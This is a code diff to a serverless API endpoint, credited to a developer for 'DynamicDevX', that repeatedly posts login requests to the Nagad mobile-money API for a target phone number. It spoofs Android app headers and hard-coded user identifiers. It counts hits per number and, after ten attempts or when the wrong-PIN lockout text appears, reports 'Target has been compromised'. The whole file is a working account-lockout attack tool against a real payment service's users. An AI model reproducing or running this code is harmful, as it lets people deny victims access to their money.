@@ -1,16 +1,19 @@
-let hitCounts = {}; // Store request counts temporarily
+import fetch from 'node-fetch';
+
+let hitMap = new Map(); // Track hit count per number
 
 export default async function handler(req, res) {
-  if (req.method !== 'GET') {
-    return res.status(405).json({ error: 'Only GET method is allowed.' });
-  }
-
   const { number } = req.query;
 
-  if (!number || number.length !== 11) {
-    return res.status(400).json({ error: 'Please provide a valid 11-digit number.' });
+  if (!number) {
+    return res.status(400).json({
+      success: false,
+      message: 'Please provide a number parameter.',
+      credit: 'Developer Tofazzal Hossain for DynamicDevX'
+    });
   }
 
+  // Prepare headers and data
   const url = 'https://app2.mynagad.com:20002/api/login';
 
   const headers = {
@@ -18,14 +21,13 @@ export default async function handler(req, res) {
     'User-Agent': 'okhttp/3.14.9',
     'Connection': 'Keep-Alive',
     'Accept-Encoding': 'gzip',
-    'Content-Type': 'application/json',
+    'Content-Type': 'application/json; charset=UTF-8',
     'X-KM-UserId': '87594060',
     'X-KM-User-MpaId': '17404103407455511125333541230563',
     'X-KM-User-AspId': '100012345612345',
     'X-KM-User-Agent': 'ANDROID/1164',
     'X-KM-Accept-language': 'bn',
-    'X-KM-AppCode': '01',
-    'Cookie': 'WMONID=-SfYtwZ56xA; JSESSIONID=g2b9KaDZrWj2couoJaX62REkp4_n1cKnbTrpYbGu'
+    'X-KM-AppCode': '01'
   };
 
   const body = {
@@ -36,49 +38,58 @@ export default async function handler(req, res) {
   };
 
   try {
-    const fetch = (await import('node-fetch')).default;
-    const response = await fetch(url, {
+    const nagadRes = await fetch(url, {
       method: 'POST',
       headers,
       body: JSON.stringify(body)
     });
 
-    const text = await response.text();
+    const text = await nagadRes.text();
 
-    // Count hits for the number
-    hitCounts[number] = (hitCounts[number] || 0) + 1;
-
-    if (text.includes('আপনার কোন নগদ অ্যাকাউন্ট নেই')) {
+    // If already locked
+    if (text.includes('একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক')) {
       return res.json({
-        status: 'invalid_number',
-        message: 'Invalid Nagad number. Please check and try again.',
-        credit: 'Tofazzal Hossain, for DynamicDevX'
+        success: true,
+        message: 'Locked Successful! Target is already locked.',
+        credit: 'Developer Tofazzal Hossain for DynamicDevX'
       });
     }
 
-    if (text.includes('একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে')) {
-      if (hitCounts[number] >= 10) {
-        return res.json({
-          status: 'locked_successful',
-          message: 'Target locked successfully.',
-          credit: 'Tofazzal Hossain, for DynamicDevX'
-        });
-      } else {
-        return res.json({
-          status: 'already_locked',
-          message: 'Target is already locked.',
-          credit: 'Tofazzal Hossain, for DynamicDevX'
-        });
-      }
+    // If invalid number
+    if (text.includes('আপনার কোন নগদ অ্যাকাউন্ট নেই')) {
+      return res.json({
+        success: false,
+        message: 'Invalid Nagad number. Please enter a valid number.',
+        credit: 'Developer Tofazzal Hossain for DynamicDevX'
+      });
     }
 
+    // Track hit count
+    const hits = hitMap.get(number) || 0;
+    const newHits = hits + 1;
+    hitMap.set(number, newHits);
+
+    // After 10 tries, say it's locked
+    if (newHits >= 10) {
+      return res.json({
+        success: true,
+        message: 'Locked Successful! Target has been compromised.',
+        credit: 'Developer Tofazzal Hossain for DynamicDevX'
+      });
+    }
+
+    // Otherwise show hit progress
     return res.json({
-      status: 'try_again',
-      message: 'Please try again later.',
-      credit: 'Tofazzal Hossain, for DynamicDevX'
+      success: true,
+      message: `Request sent (${newHits}/10)... still trying.`,
+      credit: 'Developer Tofazzal Hossain for DynamicDevX'
     });
 
   } catch (error) {
-    return res.status(500).json({ error: 'Internal server error.', details: error.message });
+    return res.status(500).json({
+      success: false,
+      message: 'Something went wrong!',
+      credit: 'Developer Tofazzal Hossain for DynamicDevX'
+    });
   }
-      }
+  }
